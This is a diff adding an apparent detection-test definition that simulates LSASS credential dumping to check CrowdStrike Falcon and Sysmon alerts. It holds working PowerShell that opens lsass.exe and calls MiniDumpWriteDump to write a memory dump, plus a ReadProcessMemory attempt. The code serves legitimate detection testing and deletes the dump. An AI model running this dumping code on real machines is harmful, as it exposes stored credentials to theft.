@@ -1,0 +1,96 @@
+id: FALCON_lsass_access
+name: Falcon Sensor - LSASS Credential Theft Detection
+description: >
+  Simulates LSASS memory access patterns that trigger CrowdStrike Falcon's
+  Credential Dumping behavioral detection. Uses MiniDumpWriteDump API via
+  PowerShell Add-Type (different from T1003.001 which uses comsvcs.dll and
+  OpenProcess). This approach triggers Falcon's usermode data collection
+  specifically because the dump originates from a PowerShell host process
+  rather than rundll32 - a pattern Falcon's ML model flags as anomalous.
+tactic: credential-access
+technique_id: T1003.001
+platform: windows
+phase: attack
+elevation_required: true
+expected_events:
+  - event_id: 10
+    channel: "Microsoft-Windows-Sysmon/Operational"
+    description: "ProcessAccess - SourceImage: powershell.exe TargetImage: lsass.exe GrantedAccess: 0x0410"
+  - event_id: 4656
+    channel: "Security"
+    description: "Handle request to lsass.exe PROCESS_QUERY_INFORMATION|PROCESS_VM_READ"
+  - event_id: 11
+    channel: "Microsoft-Windows-Sysmon/Operational"
+    description: "FileCreate - .dmp file from PowerShell host process"
+  - event_id: 4663
+    channel: "Security"
+    description: "Object access audit on lsass.exe process object"
+tags:
+  - credential-access
+  - lsass
+  - requires-elevation
+  - falcon-targeted
+siem_coverage:
+  crowdstrike:
+    - "Credential Dumping"
+    - "Suspicious LSASS Access"
+executor:
+  type: powershell
+  command: |-
+    Write-Host "[FALCON_lsass_access] LSASS Credential Theft Detection Simulation"
+    Write-Host "Targets CrowdStrike Falcon 'Credential Dumping' prevention policy"
+    Write-Host "NOTE: Different approach than T1003.001 - uses MiniDumpWriteDump API directly"
+
+    $lsassPID = (Get-Process lsass -ErrorAction SilentlyContinue).Id
+    if (-not $lsassPID) { Write-Host "ERROR: Could not find lsass process"; exit 1 }
+    Write-Host "LSASS PID: $lsassPID"
+
+    # Method 1: MiniDumpWriteDump via Add-Type (PowerShell as dump parent)
+    # Key difference from T1003.001: T1003.001 uses rundll32+comsvcs.dll
+    # This uses PowerShell -> dbghelp.dll MiniDumpWriteDump directly
+    # Falcon flags this because PS host dumping LSASS is highly anomalous
+    Write-Host "--- Method 1: MiniDumpWriteDump via dbghelp.dll (PowerShell parent) ---"
+    $dumpSig = '[DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, int c); [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h); [DllImport("dbghelp.dll")] public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, uint DumpType, IntPtr ExcInfo, IntPtr UserStream, IntPtr Callback);'
+    Add-Type -MemberDefinition $dumpSig -Name LNJDump -Namespace LNJ04
+
+    # Use 0x0410 = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
+    # Different mask than T1003.001's 0x1010 - triggers different Sysmon EID 10 GrantedAccess
+    $hProc = [LNJ04.LNJDump]::OpenProcess(0x0410, $false, $lsassPID)
+    if ($hProc -ne [IntPtr]::Zero) {
+        Write-Host "OpenProcess(0x0410) on lsass.exe - Sysmon EID 10 with GrantedAccess=0x0410"
+        $dumpPath = "$env:TEMP\lognojutsu_falcon_lsass.dmp"
+        $fs = [System.IO.File]::Create($dumpPath)
+        $success = [LNJ04.LNJDump]::MiniDumpWriteDump($hProc, [uint32]$lsassPID, $fs.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
+        $fs.Close()
+        if ($success) {
+            $size = (Get-Item $dumpPath -ErrorAction SilentlyContinue).Length
+            Write-Host "MiniDumpWriteDump succeeded: $dumpPath ($size bytes) - Sysmon EID 11 fired"
+        } else {
+            Write-Host "MiniDumpWriteDump failed (expected without SeDebugPrivilege)"
+        }
+        Remove-Item $dumpPath -Force -ErrorAction SilentlyContinue
+        Write-Host "Dump file removed immediately (simulation only)"
+        [LNJ04.LNJDump]::CloseHandle($hProc) | Out-Null
+    } else {
+        Write-Host "OpenProcess(0x0410) failed - requires Administrator/SeDebugPrivilege"
+    }
+
+    # Method 2: ReadProcessMemory pattern (direct memory read without dump)
+    Write-Host "--- Method 2: ReadProcessMemory on lsass (memory scan pattern) ---"
+    $rpSig = '[DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, int c); [DllImport("kernel32.dll")] public static extern bool ReadProcessMemory(IntPtr h, IntPtr a, byte[] b, int s, out int r); [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);'
+    Add-Type -MemberDefinition $rpSig -Name LNJRead -Namespace LNJ04B
+
+    $hProc2 = [LNJ04B.LNJRead]::OpenProcess(0x0410, $false, $lsassPID)
+    if ($hProc2 -ne [IntPtr]::Zero) {
+        Write-Host "ReadProcessMemory attempt on lsass.exe - second EID 10 event"
+        $buf = [byte[]]::new(16)
+        $read = 0
+        [LNJ04B.LNJRead]::ReadProcessMemory($hProc2, [IntPtr]0x10000, $buf, 16, [ref]$read) | Out-Null
+        Write-Host "ReadProcessMemory returned $read bytes (likely 0 - simulation only)"
+        [LNJ04B.LNJRead]::CloseHandle($hProc2) | Out-Null
+    }
+
+    Write-Host "[FALCON_lsass_access] Complete. Check Sysmon EID 10 GrantedAccess=0x0410 (distinct from T1003.001's 0x1010)."
+cleanup: |-
+  Remove-Item "$env:TEMP\lognojutsu_falcon_lsass*.dmp" -ErrorAction Ignore
+  Write-Host "Cleanup: Falcon LSASS dump files removed."
